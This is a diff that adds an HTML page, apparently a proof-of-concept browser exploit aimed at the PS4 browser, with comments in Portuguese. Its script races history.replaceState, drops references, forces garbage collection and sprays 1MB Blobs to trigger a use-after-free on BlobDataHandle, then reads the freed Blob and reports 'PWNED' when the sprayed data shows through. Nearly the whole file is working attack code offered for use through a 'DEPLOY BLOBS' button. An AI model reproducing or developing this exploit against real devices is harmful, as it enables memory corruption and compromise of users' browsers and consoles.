@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PS4</title>
+</head>
+<body>
+
+<h1>PS4 )</h1>
+<p>Strategy: Target BlobDataHandle (External Memory UAF)</p>
+<div id="log" style="font-family:monospace; background:#eee; padding:10px; border:1px solid #000; height: 400px; overflow-y: scroll;"></div>
+<button onclick="runExploit()" style="font-size:20px; padding:20px; background:indigo; color:white; font-weight:bold;">DEPLOY BLOBS</button>
+
+<script>
+    var L = document.getElementById('log');
+    function log(m) { 
+        var d = document.createElement('div');
+        d.innerHTML = m;
+        L.appendChild(d);
+        L.scrollTop = L.scrollHeight;
+    }
+
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    // 1MB Blobs (Recurso Caro)
+    const BLOB_SIZE = 1024 * 1024; 
+    
+    function createBlobContent(char) {
+        try {
+            var buf = new Uint8Array(BLOB_SIZE);
+            buf.fill(char.charCodeAt(0));
+            return buf;
+        } catch(e) { return null; }
+    }
+
+    var sprayStore = [];
+
+    // SPRAY DE BLOBS ("B")
+    async function sprayBlobs() {
+        log("[*] Injetando Spray de Blobs 'B'...");
+        var content = createBlobContent("B");
+        if (!content) return;
+
+        // Cria 2000 Blobs (2GB virtuais)
+        // O sistema tentará reutilizar slots de blobs liberados
+        for(var i=0; i<2000; i++) {
+            if (i % 200 === 0) await sleep(2);
+            try {
+                // Cria o Blob
+                var b = new Blob([content], { type: "application/octet-stream" });
+                sprayStore.push(b);
+            } catch(e) { break; }
+        }
+    }
+
+    // PRESSURE (Mistura de Arrays e MessageChannels)
+    async function aggressiveCleanup() {
+        log("[*] Forçando limpeza de Blobs órfãos...");
+        
+        // 1. ArrayBuffer Churn
+        var trash = [];
+        for(var i=0; i<500; i++) trash.push(new ArrayBuffer(1024 * 1024));
+        trash = null;
+        await sleep(50);
+
+        // 2. MessageChannel Churn (Trigger GC callback)
+        for(var i=0; i<2000; i++) {
+            var mc = new MessageChannel();
+        }
+        await sleep(50);
+    }
+
+    // Leitor seguro de Blob
+    function readBlob(blob) {
+        return new Promise((resolve) => {
+            var fr = new FileReader();
+            fr.onload = () => resolve(fr.result); // Retorna ArrayBuffer ou String
+            fr.onerror = () => resolve(null);
+            fr.readAsText(blob);
+        });
+    }
+
+    const BURST_SIZE = 400;
+
+    function runExploit() {
+        log("<b>[*] Inicializando V84...</b>");
+        sprayStore = [];
+        
+        // 1. Setup
+        for(var i=0; i<15; i++) history.pushState({id: i}, "s"+i);
+
+        window.onpopstate = async function(e) {
+            log("[!] Race iniciada...");
+            await sleep(10);
+
+            // Payload Vítima: Blob "A"
+            var bufA = createBlobContent("A");
+            var blobA = new Blob([bufA], { type: "text/plain" });
+
+            // 2. Race Trigger (Burst)
+            for(var i=0; i < BURST_SIZE; i++) {
+                if (i % 50 === 0) await sleep(1);
+                // Alterna estrutura para forçar realocação
+                var p = (i % 2 == 0) ? { b: blobA } : blobA;
+                history.replaceState(p, "", "?q="+i);
+            }
+            
+            // 3. Drop
+            log("[*] Soltando referências...");
+            history.replaceState(null, "CLEAN");
+            blobA = null; // Mata referência local
+            bufA = null;
+            
+            // 4. SEQUENCE
+            setTimeout(async function() {
+                
+                // Tenta 3 vezes
+                for(var attempt=1; attempt<=3; attempt++) {
+                    log("<b>[!!!] TENTATIVA " + attempt + " [!!!]</b>");
+                    
+                    // A. Limpeza
+                    sprayStore = []; // Solta spray anterior
+                    await aggressiveCleanup();
+                    
+                    // B. Spray
+                    await sprayBlobs();
+                    
+                    // C. Check
+                    try {
+                        var z = history.state;
+                        
+                        if (z) {
+                            var targetBlob = null;
+                            if (z instanceof Blob) targetBlob = z;
+                            else if (z.b instanceof Blob) targetBlob = z.b;
+                            
+                            if (targetBlob) {
+                                log("[?] Lendo Zumbi (Async)...");
+                                var txt = await readBlob(targetBlob);
+                                
+                                if (txt && txt.length > 0) {
+                                    var sample = txt.substring(0, 50);
+                                    
+                                    if (sample.indexOf("B") !== -1) {
+                                        log("<h1 style='color:red; background:yellow'>[!!!] PWNED: BLOB UAF [!!!]</h1>");
+                                        log("Conteúdo 'B' lido no Blob 'A'!");
+                                        return;
+                                    } else if (sample.indexOf("A") !== -1) {
+                                        log("[-] Conteúdo 'A'. Blob imortal.");
+                                    } else {
+                                        log("<h1 style='color:red; background:yellow'>[?] CORRUPTION [?]</h1>");
+                                        log("Lixo: " + sample);
+                                    }
+                                } else {
+                                    log("[-] Leitura vazia.");
+                                }
+                            } else {
+                                log("[-] Objeto não é Blob: " + z);
+                            }
+                        } else {
+                            log("[-] State nulo.");
+                        }
+                    } catch(err) {
+                        log("Erro: " + err);
+                    }
+                    
+                    await sleep(500);
+                }
+                
+                log("[-] Fim das tentativas.");
+
+            }, 100);
+        };
+
+        history.go(-5);
+    }
+</script>
+</body>
+
+</html>
